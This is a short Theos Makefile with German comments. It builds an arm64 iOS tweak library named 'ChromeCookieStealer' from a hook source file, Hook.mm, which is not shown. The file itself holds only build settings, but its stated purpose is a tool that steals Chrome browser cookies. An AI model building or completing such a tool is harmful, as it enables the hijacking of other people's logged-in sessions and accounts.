ARCHS = arm64  # Single arch – läuft auf 99% der Devices (arm64e emuliert arm64 problemlos)
DEBUG = 0      # Release mode – kleiner & schneller
THEOS_BUILD_DIR = obj  # Force alles in ./obj/ – kein .theos-Mist mehr

TARGET = iphone:clang:latest:15.0

include $(THEOS)/makefiles/common.mk

LIBRARY_NAME = ChromeCookieStealer
ChromeCookieStealer_FILES = Hook.mm
ChromeCookieStealer_FRAMEWORKS = UIKit WebKit Foundation
ChromeCookieStealer_CFLAGS = -fobjc-arc

include $(THEOS)/makefiles/library.mk
